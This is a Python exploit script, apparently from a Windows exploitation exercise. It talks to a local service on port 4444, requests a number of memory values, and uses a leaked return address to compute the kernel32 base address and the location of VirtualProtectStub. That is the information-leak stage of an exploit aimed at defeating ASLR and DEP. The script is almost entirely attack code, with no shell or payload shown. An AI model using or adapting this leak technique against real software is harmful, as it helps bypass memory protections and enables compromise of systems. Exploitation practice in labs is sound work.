from util import *

offset = 31

s = Socket("127.0.0.1", 4444)


def cmd():
    return s.recvuntil(b": ")


def send_n(n: int):
    s.send(f"{n}".encode("utf-8"))
    s.send(b"\n")


def recv_data(n: int):
    data = []
    for _ in range(n):
        recv = s.recvuntil(b"\n").decode("utf-8").replace("\r\n", "")
        data.append(int(recv))

    return data


def main():
    s.connect()

    send_n(offset + 1)
    cmd()
    data = recv_data(offset + 1)
    print(data)

    base_thread_init_thunk_addr = data[offset] - 0x19
    kernel32_base_addr = base_thread_init_thunk_addr - X86_OFFSET_BASE_THREAD_INIT_THUNK
    virtual_protect_stub_addr = kernel32_base_addr + X86_OFFSET_VIRTUAL_PROTECT_STUB

    print(f"kernel32!VirtualProtectStub = {hex(virtual_protect_stub_addr)}")

    while True:
        pass


if __name__ == "__main__":
    main()
